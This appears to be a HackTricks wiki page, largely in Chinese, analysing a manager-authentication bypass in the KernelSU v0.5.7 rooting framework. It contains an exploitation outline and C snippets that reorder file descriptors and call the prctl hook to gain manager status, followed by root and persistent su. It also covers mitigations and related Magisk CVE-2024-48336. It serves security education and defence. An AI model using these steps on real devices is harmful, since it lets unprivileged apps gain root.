# Android Rooting Frameworks (KernelSU/Magisk) Manager Auth Bypass & Syscall Hook Abuse

{{#include ../../banners/hacktricks-training.md}}

KernelSU、APatch 和 SKRoot 等 Rooting frameworks 会 patch 或 hook Android/Linux kernel，并向 unprivileged userspace manager app 暴露 privileged functionality。Magisk 将在下文单独讨论，因为 CVE-2024-48336 涉及 manager-side code loading，而不是此 KernelSU syscall path。<sup>[[1]](#references)[[5]](#references)[[13]](#references)</sup>

本页面总结了 public research 中发现的 techniques 和 pitfalls（尤其是 Zimperium 对 KernelSU v0.5.7 的分析），帮助 red team 和 blue team 理解 attack surfaces、exploitation primitives 以及可靠的 mitigations。<sup>[[1]](#references)</sup>

---
## Architecture pattern: syscall-hooked manager channel

- 在 KernelSU v0.5.7 中，针对 `prctl` 的 kernel hook 会从 userspace 接收 magic value、command ID 以及 command-specific arguments。<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>
- 调用者首先通过 `CMD_BECOME_MANAGER` 请求 manager status。Authorization 是 command-specific 的：`CMD_GRANT_ROOT` 检查 manager/allowlist state，`CMD_ALLOW_SU` 仅限 manager，`CMD_SET_SEPOLICY` 在此版本中仅限 root。<sup>[[2]](#references)[[11]](#references)</sup>
- 其他 commands 会查询 version/configuration 或报告 framework events。<sup>[[2]](#references)</sup>
- 由于任何 app 都可以调用此 syscall interface，因此 manager authentication 的正确性至关重要。<sup>[[1]](#references)[[2]](#references)</sup>

Example (KernelSU design):
- Hooked syscall: prctl
- 将调用转入 KernelSU handler 的 Magic value：0xDEADBEEF
- Commands include: CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT, etc.<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>

---
## KernelSU v0.5.7 authentication flow (as implemented)

当 userspace 调用 prctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...) 时，KernelSU 会验证：<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>

1) Path prefix check
- 提供的 path 必须以 caller UID 对应的预期 prefix 开头，例如 /data/data/<pkg> 或 /data/user/<id>/<pkg>。
- Reference: core_hook.c (v0.5.7) path prefix logic.<sup>[[2]](#references)</sup>

2) Ownership check
- 该 path 必须由 caller UID 所有。
- Reference: core_hook.c (v0.5.7) ownership logic.<sup>[[2]](#references)</sup>

3) APK signature check via FD table scan
- 按 descriptor order increasing 的顺序遍历 calling process 的 open file descriptors。
- 对于 path 以 `/data/app/` 开头且以 `/base.apk` 结尾的每个 regular file，要求其 path 包含从 supplied data-directory path 派生出的 package substring。
- 对通过这些 path checks 的第一个 candidate 验证其 signature。
- Parse APK v2 signature，并针对 official manager certificate 进行验证。
- References: manager.c (iterating FDs), apk_sign.c (APK v2 verification)。<sup>[[3]](#references)[[4]](#references)</sup>

如果所有 checks 都通过，kernel 会暂时缓存 manager 的 UID；之后 manager-only commands 会接受该 UID，而其他 commands 仍使用其自身 UID 或执行 allowlist checks。<sup>[[2]](#references)[[3]](#references)</sup>

---
## Vulnerability class: trusting path-derived APK selection

KernelSU v0.5.7 不会将 signature result 与 PackageManager 的 installed package identity 绑定。在 `manager.c` 中，package test 仅是 path substring check（`strstr(cwd, pkg)`）；随后会对第一个通过该 test 的 candidate 进行 signature check。因此，attacker 可以将 genuine manager APK 放置在同时包含 attacker package name 的 `/data/app/` path 下，并安排它首先被选中。<sup>[[1]](#references)[[3]](#references)[[4]](#references)</sup>

这种 trust-by-indirection 允许 unprivileged app 在不持有 manager signing key 的情况下 impersonate manager。<sup>[[1]](#references)</sup>

Key properties exploited:<sup>[[1]](#references)[[3]](#references)</sup>
- FD scan 按 descriptor index 排序，而 package check 是 path substring test，并非经过验证的 package-to-APK identity binding。
- `open()` 会返回最低可用的 FD。通过先关闭编号较低的 FDs，attacker 可以控制 ordering。
- Bundled manager APK 可以放置在 `/data/app/` 下一个包含 attacker package string 的 path 中，同时保留 official manager signature。

---
## Attack preconditions

具体的 KernelSU v0.5.7 case 需要满足：<sup>[[1]](#references)[[3]](#references)</sup>

- 设备已经使用 vulnerable rooting framework（例如 KernelSU v0.5.7）获得 root。
- Attacker 可以在本地运行任意 unprivileged code（Android app process）。
- 对于 v0.5.7 implementation，`current->real_parent` 必须具有 UID 0（source comment 将其描述为 zygote direct-child requirement）；`manager.c` 会拒绝其他 parents。<sup>[[3]](#references)</sup>
- Real manager 尚未完成 authentication（例如刚 reboot 后）。某些 frameworks 会在成功后缓存 manager UID；你必须赢得 race。<sup>[[1]](#references)</sup>

---
## Exploitation outline (KernelSU v0.5.7)

High-level steps（引用的 demo video 展示了 public proof of concept 的运行过程）：<sup>[[1]](#references)[[2]](#references)[[10]](#references)</sup>
1) 构造指向自己 app data directory 的有效 path，以满足 prefix 和 ownership checks。
2) 将 genuine KernelSU Manager base.apk 放置在 `/data/app/` 下一个包含自身 package string 的 path 中，然后在低于自身 base.apk 的 FD 编号上打开它。
3) 调用 prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...)，以通过 checks。
4) 使用 `CMD_GRANT_ROOT`，然后使用 `CMD_ALLOW_SU` 获取 persistent su；仅在获得 root 且受支持的情况下调用 root-only `CMD_SET_SEPOLICY`。

Practical notes on step 2 (FD ordering):<sup>[[1]](#references)</sup>
- 通过遍历 `/proc/self/fd` symlinks，确定自身 process 中指向自己的 /data/app/*/base.apk 的 FD。
- 关闭一个较低的 FD（例如 stdin、fd 0），然后先打开 legitimate manager APK，使其占用 fd 0（或任何低于自身 base.apk fd 的 index）。
- 将 legitimate manager APK bundled 到你的 app 中，使其 path 以 `/data/app/` 开头、以 `/base.apk` 结尾，并包含你的 package string。例如，位于 app 的 `lib` directory 下的 path 可以满足这些 checks。<sup>[[1]](#references)[[3]](#references)</sup>

Example code snippets (Android/Linux, illustrative only):

Enumerate open FDs to locate base.apk entries:
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
强制一个编号更低的 FD 指向合法的 manager APK：
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
通过 KernelSU v0.5.7 的 `prctl` hook 实现 Manager 身份验证：<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 1  // KernelSU v0.5.7; other frameworks differ

int become_manager(const char *my_data_dir) {
uint32_t reply = 0;
// arg3: data path; arg4: unused; arg5: userspace result pointer
(void)prctl(KSU_MAGIC, CMD_BECOME_MANAGER,
(unsigned long)my_data_dir, 0UL,
(unsigned long)&reply);
return reply == KSU_MAGIC ? 0 : -1;
}
```
成功后，可执行的特权命令（示例）：<sup>[[2]](#references)[[11]](#references)</sup>
- CMD_GRANT_ROOT: 将当前进程提升为 root
- CMD_ALLOW_SU: 将你的 package/UID 添加到 allowlist，以持久化使用 su
- CMD_SET_SEPOLICY: 获取 root 后调整 SELinux policy；KernelSU v0.5.7 会检查该命令的 UID 是否为 0。<sup>[[2]](#references)</sup>

竞态/持久化提示：
- 在 AndroidManifest 中注册一个 BOOT_COMPLETED receiver（`RECEIVE_BOOT_COMPLETED`），使其在重启后启动，并尝试在真正的 manager 之前完成 authentication；该 permission 仅授权接收 `ACTION_BOOT_COMPLETED`，但本身不保证 scheduling priority。<sup>[[1]](#references)[[12]](#references)</sup>

---
## Detection and mitigation guidance

对于 framework developers：
- 将 authentication 绑定到 caller 的 package/UID，而不是任意 FD：
- 根据 UID 解析 caller 的 package，并通过 PackageManager 与已安装 package 的 signature 进行验证，而不是扫描 FD。
- 如果仅依赖 kernel，则使用稳定的 caller identity（task creds），并通过由 init/userspace helper 管理的稳定事实来源进行验证，而不是使用 process FD。
- 避免将路径前缀检查作为 identity；caller 可以轻易满足此条件。
- 在 channel 上使用基于 nonce 的 challenge–response，并在 boot 或关键事件发生时清除任何缓存的 manager identity。
- 在可行的情况下，考虑使用基于 binder 且经过 authentication 的 IPC，而不是滥用通用 syscall。

对于 defenders/blue team：
- 检测 rooting frameworks 和 manager processes 的存在；如果拥有 kernel telemetry，则监控带有可疑 magic constants（例如 0xDEADBEEF）的 prctl calls。<sup>[[1]](#references)[[11]](#references)</sup>
- 在受管控的设备群中，阻止或对不受信任 package 的 boot receivers 发出 alert，尤其是它们在 boot 后快速尝试执行特权 manager commands 时。
- 确保设备已更新到修复漏洞的 framework 版本；在更新时使缓存的 manager IDs 失效。

该 attack 的限制：<sup>[[1]](#references)[[2]](#references)</sup>
- 仅影响已经通过存在漏洞的 framework 获取 root 的设备。
- 通常需要在合法 manager 完成 authentication 之前利用 reboot/race window（某些 frameworks 会一直缓存 manager UID，直到 reset）。

---
## Related notes across frameworks

- 基于 password 的 auth（例如历史版本的 APatch/SKRoot builds）如果 password 易于猜测或进行 bruteforce，或者 validation 存在 bug，则可能较弱。<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- 基于 package/signature 的 auth（例如 KernelSU）原则上更强，但必须绑定到实际 caller，而不是绑定到通过 FD scans 选择的、从路径派生的 artefacts。<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- Magisk：CVE-2024-48336 影响了 Canary 27007 之前的 builds；这些 builds 会从未经验证的 GMS package 加载 code，使本地 app 能够在 Magisk app 中执行 code，并在无需用户交互的情况下提升为 root。<sup>[[8]](#references)[[9]](#references)[[13]](#references)</sup>

---
## References

- [1] [Zimperium – The Rooting of All Evil：可能危害移动设备的安全漏洞](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [2] [KernelSU v0.5.7 – core_hook.c authentication checks](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L149-L205)
- [3] [KernelSU v0.5.7 – manager.c FD iteration, package check and signature call](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L16-L67)
- [4] [KernelSU v0.5.7 – apk_sign.c APK v2 verification](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/apk_sign.c#L6-L119)
- [5] [KernelSU project](https://kernelsu.org/)
- [6] [APatch](https://github.com/bmax121/APatch)
- [7] [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [8] [Magisk issue #8279 – Verify GMS is system app](https://github.com/topjohnwu/Magisk/issues/8279)
- [9] [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [10] [KSU PoC demo video (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)
- [11] [KernelSU v0.5.7 – ksu.h command identifiers](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/ksu.h#L12-L24)
- [12] [Android Manifest.permission.RECEIVE_BOOT_COMPLETED](https://developer.android.com/reference/android/Manifest.permission#RECEIVE_BOOT_COMPLETED)
- [13] [NVD – CVE-2024-48336](https://nvd.nist.gov/vuln/detail/CVE-2024-48336)
{{#include ../../banners/hacktricks-training.md}}
